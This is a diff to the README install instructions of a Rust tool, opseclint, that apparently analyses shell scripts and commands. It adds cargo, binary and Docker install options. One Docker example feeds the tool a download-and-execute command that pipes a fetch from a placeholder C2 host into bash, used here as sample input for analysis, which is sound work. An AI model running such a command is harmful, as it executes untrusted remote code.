@@ -32,9 +32,21 @@ stealthy.
 ## Install
 
 ```bash
-cargo install --path .
-# or, from a checkout:
-cargo build --release   # -> target/release/opseclint
+cargo install opseclint          # from crates.io
+# or grab a prebuilt binary from the Releases page
+# or build from a checkout:
+cargo build --release            # -> target/release/opseclint
+```
+
+### Docker
+
+A tiny (~750 KB, `scratch`-based) image is published to GHCR:
+
+```bash
+# analyze a file (mount it into the container)
+docker run --rm -v "$PWD":/work ghcr.io/gerrrt/opseclint /work/script.sh
+# or a single command
+docker run --rm ghcr.io/gerrrt/opseclint -c 'curl http://c2/x | bash'
 ```
 
 ## Usage
